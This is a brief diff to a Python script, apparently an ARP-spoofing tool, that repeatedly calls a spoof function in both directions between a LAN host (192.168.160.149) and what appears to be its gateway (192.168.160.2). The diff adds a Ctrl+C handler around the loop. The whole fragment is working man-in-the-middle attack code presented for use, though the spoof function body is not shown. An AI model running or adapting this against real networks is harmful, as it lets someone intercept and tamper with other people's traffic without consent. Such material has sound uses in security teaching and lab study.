@@ -17,9 +17,12 @@ def spoof(target_ip, spoof_ip):
 
 
 count = 0
-while True:
-    spoof('192.168.160.149', '192.168.160.2')
-    spoof('192.168.160.2', '192.168.160.149')
-    count = count + 2
-    print(f'\r[+] Packets sent: {count}', end='')
-    time.sleep(2)
+try:
+    while True:
+        spoof('192.168.160.149', '192.168.160.2')
+        spoof('192.168.160.2', '192.168.160.149')
+        count = count + 2
+        print(f'\r[+] Packets sent: {count}', end='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('CTRL + C Detected. Quitting Now.')
